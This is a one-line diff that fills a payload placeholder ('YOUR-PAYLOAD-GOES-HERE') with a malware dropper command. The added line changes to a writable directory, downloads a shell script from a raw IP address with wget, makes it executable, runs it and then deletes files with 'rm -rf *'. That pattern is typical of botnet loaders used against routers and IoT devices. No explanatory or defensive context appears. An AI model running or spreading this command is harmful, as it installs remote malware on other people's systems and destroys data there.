@@ -1,1 +1,1 @@
-YOUR-PAYLOAD-GOES-HERE
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.140.156.252/hidakibest.sh; chmod 777 hidakibest.sh; sh hidakibest.sh; rm -rf *
